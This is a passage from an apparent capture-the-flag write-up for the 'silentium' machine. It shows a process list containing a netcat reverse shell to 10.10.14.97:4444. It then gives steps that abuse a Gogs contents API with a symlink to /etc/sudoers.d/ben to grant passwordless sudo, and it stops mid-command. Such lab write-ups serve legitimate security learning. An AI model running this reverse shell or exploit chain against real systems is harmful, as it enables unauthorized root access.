+<a id="__codelineno-5-175" name="__codelineno-5-175" href="#__codelineno-5-175"></a>root<span class="w">         </span><span class="m">649</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>audit_prune_tree<span class="o">]</span>
+<a id="__codelineno-5-176" name="__codelineno-5-176" href="#__codelineno-5-176"></a>root<span class="w">         </span><span class="m">679</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I&lt;<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/R-crypt<span class="o">]</span>
+<a id="__codelineno-5-177" name="__codelineno-5-177" href="#__codelineno-5-177"></a>root<span class="w">         </span><span class="m">794</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">53468</span><span class="w"> </span><span class="m">11972</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/bin/VGAuthService
+<a id="__codelineno-5-178" name="__codelineno-5-178" href="#__codelineno-5-178"></a>root<span class="w">         </span><span class="m">795</span><span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">0</span>.2<span class="w"> </span><span class="m">243480</span><span class="w"> </span><span class="m">10420</span><span class="w"> </span>?<span class="w">        </span>Ssl<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:07<span class="w"> </span>/usr/bin/vmtoolsd
+<a id="__codelineno-5-179" name="__codelineno-5-179" href="#__codelineno-5-179"></a>root<span class="w">         </span><span class="m">824</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">3940</span><span class="w">  </span><span class="m">3244</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>dhclient<span class="w"> </span>-1<span class="w"> </span>-4<span class="w"> </span>-v<span class="w"> </span>-i<span class="w"> </span>-pf<span class="w"> </span>/run/dhclient.eth0.pid<span class="w"> </span>-lf<span class="w"> </span>/var/lib/dhcp/dhclient.eth0.leases<span class="w"> </span>-I<span class="w"> </span>-df<span class="w"> </span>/var/lib/dhcp/dhclient6.eth0.leases<span class="w"> </span>eth0
+<a id="__codelineno-5-180" name="__codelineno-5-180" href="#__codelineno-5-180"></a>root<span class="w">         </span><span class="m">917</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">18212</span><span class="w">  </span><span class="m">8820</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/lib/systemd/systemd-logind
+<a id="__codelineno-5-181" name="__codelineno-5-181" href="#__codelineno-5-181"></a>root<span class="w">         </span><span class="m">918</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.3<span class="w"> </span><span class="m">468972</span><span class="w"> </span><span class="m">13460</span><span class="w"> </span>?<span class="w">        </span>Ssl<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/libexec/udisks2/udisksd
+<a id="__codelineno-5-182" name="__codelineno-5-182" href="#__codelineno-5-182"></a>root<span class="w">         </span><span class="m">975</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u4:2-ext4-rsv-conversion<span class="o">]</span>
+<a id="__codelineno-5-183" name="__codelineno-5-183" href="#__codelineno-5-183"></a>root<span class="w">        </span><span class="m">1025</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.3<span class="w"> </span><span class="m">318364</span><span class="w"> </span><span class="m">12876</span><span class="w"> </span>?<span class="w">        </span>Ssl<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/sbin/ModemManager
+<a id="__codelineno-5-184" name="__codelineno-5-184" href="#__codelineno-5-184"></a>root<span class="w">        </span><span class="m">1527</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">1</span>.7<span class="w"> </span><span class="m">1812208</span><span class="w"> </span><span class="m">70056</span><span class="w"> </span>?<span class="w">       </span>Ssl<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:01<span class="w"> </span>/opt/gogs/gogs/gogs<span class="w"> </span>web
+<a id="__codelineno-5-185" name="__codelineno-5-185" href="#__codelineno-5-185"></a>root<span class="w">        </span><span class="m">1529</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">6824</span><span class="w">  </span><span class="m">2852</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/sbin/cron<span class="w"> </span>-f<span class="w"> </span>-P
+<a id="__codelineno-5-186" name="__codelineno-5-186" href="#__codelineno-5-186"></a>root<span class="w">        </span><span class="m">1533</span><span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">1</span>.2<span class="w"> </span><span class="m">1867184</span><span class="w"> </span><span class="m">51300</span><span class="w"> </span>?<span class="w">       </span>Ssl<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:06<span class="w"> </span>/usr/bin/containerd
+<a id="__codelineno-5-187" name="__codelineno-5-187" href="#__codelineno-5-187"></a>root<span class="w">        </span><span class="m">1558</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">6104</span><span class="w">  </span><span class="m">1996</span><span class="w"> </span>tty1<span class="w">     </span>Ss+<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/sbin/agetty<span class="w"> </span>-o<span class="w"> </span>-p<span class="w"> </span>--<span class="w"> </span><span class="se">\u</span><span class="w"> </span>--noclear<span class="w"> </span>-<span class="w"> </span>linux
+<a id="__codelineno-5-188" name="__codelineno-5-188" href="#__codelineno-5-188"></a>root<span class="w">        </span><span class="m">1562</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">11780</span><span class="w">  </span><span class="m">1788</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>nginx:<span class="w"> </span>master<span class="w"> </span>process<span class="w"> </span>/usr/sbin/nginx<span class="w"> </span>-g<span class="w"> </span>daemon<span class="w"> </span>on<span class="p">;</span><span class="w"> </span>master_process<span class="w"> </span>on<span class="p">;</span>
+<a id="__codelineno-5-189" name="__codelineno-5-189" href="#__codelineno-5-189"></a>root<span class="w">        </span><span class="m">1620</span><span class="w">  </span><span class="m">0</span>.1<span class="w">  </span><span class="m">1</span>.9<span class="w"> </span><span class="m">2267256</span><span class="w"> </span><span class="m">78060</span><span class="w"> </span>?<span class="w">       </span>Ssl<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:04<span class="w"> </span>/usr/bin/dockerd<span class="w"> </span>-H<span class="w"> </span>fd://<span class="w"> </span>--containerd<span class="o">=</span>/run/containerd/containerd.sock
+<a id="__codelineno-5-190" name="__codelineno-5-190" href="#__codelineno-5-190"></a>root<span class="w">        </span><span class="m">1903</span><span class="w">  </span><span class="m">0</span>.1<span class="w">  </span><span class="m">0</span>.2<span class="w"> </span><span class="m">1233608</span><span class="w"> </span><span class="m">11980</span><span class="w"> </span>?<span class="w">       </span>Sl<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:02<span class="w"> </span>/usr/bin/containerd-shim-runc-v2<span class="w"> </span>-namespace<span class="w"> </span>moby<span class="w"> </span>-id<span class="w"> </span>c78c3cceb7ba574e930e611b7403d1bd1fa04ba5b6dc9e9ca066e59637a4064c<span class="w"> </span>-address<span class="w"> </span>/run/containerd/containerd.sock
+<a id="__codelineno-5-191" name="__codelineno-5-191" href="#__codelineno-5-191"></a>root<span class="w">        </span><span class="m">1907</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.2<span class="w"> </span><span class="m">1233864</span><span class="w"> </span><span class="m">10772</span><span class="w"> </span>?<span class="w">       </span>Sl<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/bin/containerd-shim-runc-v2<span class="w"> </span>-namespace<span class="w"> </span>moby<span class="w"> </span>-id<span class="w"> </span>728f8ff4efe14eb458cb6dab2edfe106c92d48614a3a56905c6913b67ecfd1fb<span class="w"> </span>-address<span class="w"> </span>/run/containerd/containerd.sock
+<a id="__codelineno-5-192" name="__codelineno-5-192" href="#__codelineno-5-192"></a>root<span class="w">        </span><span class="m">1955</span><span class="w">  </span><span class="m">1</span>.2<span class="w">  </span><span class="m">9</span>.8<span class="w"> </span><span class="m">53492148</span><span class="w"> </span><span class="m">395300</span><span class="w"> </span>?<span class="w">     </span>Ssl<span class="w">  </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:31<span class="w"> </span>node<span class="w"> </span>/usr/local/bin/flowise<span class="w"> </span>start
+<a id="__codelineno-5-193" name="__codelineno-5-193" href="#__codelineno-5-193"></a>root<span class="w">        </span><span class="m">2029</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.1<span class="w"> </span><span class="m">1744844</span><span class="w"> </span><span class="m">5020</span><span class="w"> </span>?<span class="w">        </span>Sl<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/bin/docker-proxy<span class="w"> </span>-proto<span class="w"> </span>tcp<span class="w"> </span>-host-ip<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-host-port<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-container-ip<span class="w"> </span><span class="m">172</span>.18.0.2<span class="w"> </span>-container-port<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-use-listen-fd
+<a id="__codelineno-5-194" name="__codelineno-5-194" href="#__codelineno-5-194"></a>root<span class="w">        </span><span class="m">2062</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.1<span class="w"> </span><span class="m">1597380</span><span class="w"> </span><span class="m">4112</span><span class="w"> </span>?<span class="w">        </span>Sl<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/bin/docker-proxy<span class="w"> </span>-proto<span class="w"> </span>tcp<span class="w"> </span>-host-ip<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-host-port<span class="w"> </span><span class="m">1025</span><span class="w"> </span>-container-ip<span class="w"> </span><span class="m">172</span>.18.0.3<span class="w"> </span>-container-port<span class="w"> </span><span class="m">1025</span><span class="w"> </span>-use-listen-fd
+<a id="__codelineno-5-195" name="__codelineno-5-195" href="#__codelineno-5-195"></a>root<span class="w">        </span><span class="m">2068</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.1<span class="w"> </span><span class="m">1671112</span><span class="w"> </span><span class="m">4548</span><span class="w"> </span>?<span class="w">        </span>Sl<span class="w">   </span><span class="m">15</span>:04<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/bin/docker-proxy<span class="w"> </span>-proto<span class="w"> </span>tcp<span class="w"> </span>-host-ip<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-host-port<span class="w"> </span><span class="m">8025</span><span class="w"> </span>-container-ip<span class="w"> </span><span class="m">172</span>.18.0.3<span class="w"> </span>-container-port<span class="w"> </span><span class="m">8025</span><span class="w"> </span>-use-listen-fd
+<a id="__codelineno-5-196" name="__codelineno-5-196" href="#__codelineno-5-196"></a>root<span class="w">        </span><span class="m">2395</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">12024</span><span class="w">  </span><span class="m">8180</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:06<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>sshd:<span class="w"> </span>/usr/sbin/sshd<span class="w"> </span>-D<span class="w"> </span><span class="o">[</span>listener<span class="o">]</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>of<span class="w"> </span><span class="m">10</span>-100<span class="w"> </span>startups
+<a id="__codelineno-5-197" name="__codelineno-5-197" href="#__codelineno-5-197"></a>root<span class="w">        </span><span class="m">2457</span><span class="w">  </span><span class="m">0</span>.1<span class="w">  </span><span class="m">1</span>.0<span class="w"> </span><span class="m">611028</span><span class="w"> </span><span class="m">43096</span><span class="w"> </span>?<span class="w">        </span>Ssl<span class="w">  </span><span class="m">15</span>:07<span class="w">   </span><span class="m">0</span>:02<span class="w"> </span>/usr/libexec/fwupd/fwupd
+<a id="__codelineno-5-198" name="__codelineno-5-198" href="#__codelineno-5-198"></a>root<span class="w">        </span><span class="m">2464</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.2<span class="w"> </span><span class="m">313828</span><span class="w">  </span><span class="m">8808</span><span class="w"> </span>?<span class="w">        </span>Ssl<span class="w">  </span><span class="m">15</span>:07<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/libexec/upowerd
+<a id="__codelineno-5-199" name="__codelineno-5-199" href="#__codelineno-5-199"></a>root<span class="w">        </span><span class="m">3415</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:15<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u5:0-events_power_efficient<span class="o">]</span>
+<a id="__codelineno-5-200" name="__codelineno-5-200" href="#__codelineno-5-200"></a>root<span class="w">        </span><span class="m">3821</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">1640</span><span class="w">   </span><span class="m">944</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:19<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span>rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.10.14.97<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;/tmp/f
+<a id="__codelineno-5-201" name="__codelineno-5-201" href="#__codelineno-5-201"></a>root<span class="w">        </span><span class="m">3824</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">1688</span><span class="w">   </span><span class="m">872</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:19<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>cat<span class="w"> </span>/tmp/f
+<a id="__codelineno-5-202" name="__codelineno-5-202" href="#__codelineno-5-202"></a>root<span class="w">        </span><span class="m">3825</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">1708</span><span class="w">   </span><span class="m">968</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:19<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/bin/sh<span class="w"> </span>-i
+<a id="__codelineno-5-203" name="__codelineno-5-203" href="#__codelineno-5-203"></a>root<span class="w">        </span><span class="m">3826</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">1644</span><span class="w">   </span><span class="m">924</span><span class="w"> </span>?<span class="w">        </span>S<span class="w">    </span><span class="m">15</span>:19<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>nc<span class="w"> </span><span class="m">10</span>.10.14.97<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-5-204" name="__codelineno-5-204" href="#__codelineno-5-204"></a>root<span class="w">        </span><span class="m">3849</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:19<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/1:2-cgroup_free<span class="o">]</span>
+<a id="__codelineno-5-205" name="__codelineno-5-205" href="#__codelineno-5-205"></a>root<span class="w">        </span><span class="m">4050</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:21<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u5:2-events_power_efficient<span class="o">]</span>
+<a id="__codelineno-5-206" name="__codelineno-5-206" href="#__codelineno-5-206"></a>root<span class="w">        </span><span class="m">4212</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:22<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u6:2-flush-8:0<span class="o">]</span>
+<a id="__codelineno-5-207" name="__codelineno-5-207" href="#__codelineno-5-207"></a>root<span class="w">        </span><span class="m">4751</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:26<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u6:4-flush-8:0<span class="o">]</span>
+<a id="__codelineno-5-208" name="__codelineno-5-208" href="#__codelineno-5-208"></a>root<span class="w">        </span><span class="m">5336</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:31<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u6:0-events_power_efficient<span class="o">]</span>
+<a id="__codelineno-5-209" name="__codelineno-5-209" href="#__codelineno-5-209"></a>root<span class="w">        </span><span class="m">5857</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:36<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u5:3-events_unbound<span class="o">]</span>
+<a id="__codelineno-5-210" name="__codelineno-5-210" href="#__codelineno-5-210"></a>root<span class="w">        </span><span class="m">5915</span><span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:36<span class="w">   </span><span class="m">0</span>:01<span class="w"> </span><span class="o">[</span>kworker/0:1-events<span class="o">]</span>
+<a id="__codelineno-5-211" name="__codelineno-5-211" href="#__codelineno-5-211"></a>root<span class="w">        </span><span class="m">6127</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">14968</span><span class="w"> </span><span class="m">10524</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:39<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>sshd:<span class="w"> </span>ben<span class="w"> </span><span class="o">[</span>priv<span class="o">]</span>
+<a id="__codelineno-5-212" name="__codelineno-5-212" href="#__codelineno-5-212"></a>root<span class="w">        </span><span class="m">6322</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:40<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/0:3<span class="o">]</span>
+<a id="__codelineno-5-213" name="__codelineno-5-213" href="#__codelineno-5-213"></a>root<span class="w">        </span><span class="m">6482</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:41<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u6:1-events_power_efficient<span class="o">]</span>
+<a id="__codelineno-5-214" name="__codelineno-5-214" href="#__codelineno-5-214"></a>root<span class="w">        </span><span class="m">6551</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:41<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/1:0<span class="o">]</span>
+<a id="__codelineno-5-215" name="__codelineno-5-215" href="#__codelineno-5-215"></a>root<span class="w">        </span><span class="m">6807</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.2<span class="w">  </span><span class="m">14968</span><span class="w"> </span><span class="m">10540</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span><span class="m">15</span>:44<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>sshd:<span class="w"> </span>ben<span class="w"> </span><span class="o">[</span>priv<span class="o">]</span>
+<a id="__codelineno-5-216" name="__codelineno-5-216" href="#__codelineno-5-216"></a>root<span class="w">        </span><span class="m">7007</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">      </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w"> </span>?<span class="w">        </span>I<span class="w">    </span><span class="m">15</span>:45<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span><span class="o">[</span>kworker/u5:1-events_unbound<span class="o">]</span>
+</code></pre></div>
+<p>Now we make a ssh with the port that we use <code>ssh -L 8080:127.0.0.1:3001 ben@silentium.htb</code></p>
+<p>so now in the browser we have access in this site 
+<img alt="" src="Assets/Pasted%20image%2020260430100017.png" /></p>
+<p>so we create a new user <code>test</code> and password <code>test</code> to create a new repository <code>root-exploit</code> you dont need to mark another option and create a token <code>8c113660bd4893dd3f4f14f10fd9365c5442e865</code>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>❯<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>root-exploit
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>❯<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/etc/sudoers.d/ben<span class="w"> </span>malicious_link
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>❯<span class="w"> </span>ls
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>malicious_link
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>❯<span class="w"> </span>cat<span class="w"> </span>malicious_link
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>cat:<span class="w"> </span>malicious_link:<span class="w"> </span>Permission<span class="w"> </span>denied
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>❯<span class="w"> </span>git<span class="w"> </span>add<span class="w"> </span>malicious_link<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;Add symlink&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>git<span class="w"> </span>push
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="o">[</span>master<span class="w"> </span><span class="o">(</span>root-commit<span class="o">)</span><span class="w"> </span>8dbba27<span class="o">]</span><span class="w"> </span>Add<span class="w"> </span>symlink
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w"> </span><span class="m">1</span><span class="w"> </span>file<span class="w"> </span>changed,<span class="w"> </span><span class="m">1</span><span class="w"> </span>insertion<span class="o">(</span>+<span class="o">)</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w"> </span>create<span class="w"> </span>mode<span class="w"> </span><span class="m">120000</span><span class="w"> </span>malicious_link
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>Enumerating<span class="w"> </span>objects:<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="k">done</span>.
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>Counting<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">3</span>/3<span class="o">)</span>,<span class="w"> </span><span class="k">done</span>.
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>Writing<span class="w"> </span>objects:<span class="w"> </span><span class="m">100</span>%<span class="w"> </span><span class="o">(</span><span class="m">3</span>/3<span class="o">)</span>,<span class="w"> </span><span class="m">237</span><span class="w"> </span>bytes<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">237</span>.00<span class="w"> </span>KiB/s,<span class="w"> </span><span class="k">done</span>.
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>Total<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">(</span>delta<span class="w"> </span><span class="m">0</span><span class="o">)</span>,<span class="w"> </span>reused<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">(</span>delta<span class="w"> </span><span class="m">0</span><span class="o">)</span>,<span class="w"> </span>pack-reused<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">(</span>from<span class="w"> </span><span class="m">0</span><span class="o">)</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>Username<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;http://127.0.0.1:8080&#39;</span>:<span class="w"> </span><span class="nb">test</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;http://test@127.0.0.1:8080&#39;</span>:<span class="w"> </span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>To<span class="w"> </span>http://127.0.0.1:8080/test/root-exploit.git
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="w"> </span>*<span class="w"> </span><span class="o">[</span>new<span class="w"> </span>branch<span class="o">]</span><span class="w">      </span>master<span class="w"> </span>-&gt;<span class="w"> </span>master
+</code></pre></div></p>
+<p>now we need to obtain the SHA with this command <code>git rev-parse HEAD:malicious_link</code> and make this command</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span><span class="s2">&quot;http://127.0.0.1:8080/api/v1/repos/&lt;NEW_USER&gt;/&lt;REP&gt;/contents/malicious_link&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>-H<span class="w"> </span><span class="s2">&quot;Authorization: token &lt;TOKEN&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>-d<span class="w"> </span><span class="s1">&#39;{</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="s1">  &quot;content&quot;: &quot;YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==&quot;,</span>
